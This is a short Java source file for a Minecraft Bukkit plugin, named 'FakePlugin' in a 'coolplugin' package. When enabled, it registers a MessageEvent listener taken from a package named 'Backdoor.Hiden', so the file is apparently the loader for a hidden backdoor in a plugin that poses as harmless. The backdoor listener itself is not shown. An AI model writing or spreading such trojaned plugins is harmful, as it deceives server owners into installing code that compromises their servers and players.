package in.main.coolplugin;

import in.Backdoor.Hiden.events.MessageEvent;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;

public class FakePlugin extends JavaPlugin {
    @Override
    public void onEnable() {
    getServer().getPluginManager().registerEvents(new MessageEvent(), this);
    getServer().getConsoleSender().sendMessage(ChatColor.RED + "[FakePlugin]This Plugin is now enabled!");
    }

    @Override
    public void onDisable() {
        getServer().getConsoleSender().sendMessage(ChatColor.RED + "[FakePlugin]This Plugin is now disabled");

    }
}
